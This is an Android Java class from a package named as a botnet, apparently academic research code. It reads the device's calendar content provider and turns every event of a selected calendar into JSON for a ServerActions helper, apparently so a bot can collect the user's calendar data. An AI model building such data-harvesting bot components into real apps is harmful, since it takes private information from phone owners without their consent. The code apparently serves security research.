package de.tudarmstadt.botnet.janus_yanai;

import org.json.JSONArray;
import org.json.JSONException;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class CalendarManager {

	ContentResolver cp;
	
	public CalendarManager(ContentResolver cp) {
		this.cp = cp;
	}
	
	static final String DEBUG_TAG = "CalendarActivity";

	int ListSelectedCalendars() {
		int result = 0;
		String[] projection = new String[] { "_id", "name" };
		String selection = "selected=1";
		String path = "calendars";

		Cursor managedCursor = getCalendarManagedCursor(projection, selection,
				path);

		if (managedCursor != null && managedCursor.moveToFirst()) {
			int nameColumn = managedCursor.getColumnIndex("name");
			int idColumn = managedCursor.getColumnIndex("_id");

			do {
				String calName = managedCursor.getString(nameColumn);
				String calId = managedCursor.getString(idColumn);
				Log.i(DEBUG_TAG, "Found Calendar '" + calName + "' (ID="
						+ calId + ")");
//				if (calName != null && calName.contains("Test")) {
					result = Integer.parseInt(calId);
					break;
//				}
			} while (managedCursor.moveToNext());
			managedCursor.close();
		}

		return result;

	}

	JSONArray ListAllCalendarEntries(int calID, Iterable<String> fields) throws JSONException {
		Cursor managedCursor = getCalendarManagedCursor(null, "calendar_id="
				+ calID, "events");

		JSONArray arr = ServerActions.iterateCursor(managedCursor, fields);
		//JSONArray arr = ServerActions.iterateCursor(managedCursor);
    	if (managedCursor != null) managedCursor.close();
    	return arr;
	}

	/*
	JSONArray ListCalendarEntry(int eventId) throws JSONException {		
		Cursor managedCursor = getCalendarManagedCursor(null, null, "events/" + eventId);

		JSONArray arr = ServerActions.iterateCursor(managedCursor);
    	if (managedCursor != null) managedCursor.close();
    	return arr;
	}

	JSONArray ListCalendarEntrySummary(int eventId) throws JSONException {
		String[] projection = new String[] { "_id", "title", "dtstart" };
		Cursor managedCursor = getCalendarManagedCursor(projection,
				null, "events/" + eventId);

		JSONArray arr = ServerActions.iterateCursor(managedCursor);
    	if (managedCursor != null) managedCursor.close();
    	return arr;
	}
	*/

	Cursor getCalendarManagedCursor(String[] projection,
			String selection, String path) {
		Uri calendars = Uri.parse("content://calendar/" + path);

		Cursor managedCursor = null;
		try {
			managedCursor = cp.query(calendars, projection, selection,
					null, null);
		} catch (IllegalArgumentException e) {
			throw new RuntimeException("Failed to get provider at ["
					+ calendars.toString() + "]");
		}

		if (managedCursor == null) {
			// try again
			calendars = Uri.parse("content://com.android.calendar/" + path);
			try {
				managedCursor = cp.query(calendars, projection, selection,
						null, null);
			} catch (IllegalArgumentException e) {
				throw new RuntimeException("Failed to get provider at ["
						+ calendars.toString() + "]");
			}
		}
		return managedCursor;
	}

	/*
	 * Determines if it's a pre 2.1 or a 2.2 calendar Uri, and returns the Uri
	 */
	/*
	String getCalendarUriBase() {
		String calendarUriBase = null;
		Uri calendars = Uri.parse("content://calendar/calendars");
		Cursor managedCursor = null;
		try {
			managedCursor = cp.query(calendars, null, null, null, null);
		} catch (Exception e) {
			// eat
		}

		if (managedCursor != null) {
			calendarUriBase = "content://calendar/";
		} else {
			calendars = Uri.parse("content://com.android.calendar/calendars");
			try {
				managedCursor = cp.query(calendars, null, null, null, null);
			} catch (Exception e) {
				throw new RuntimeException(e);
			}

			if (managedCursor != null) {
				calendarUriBase = "content://com.android.calendar/";
			}

		}
		
		managedCursor.close();

		return calendarUriBase;
	}
	*/

}
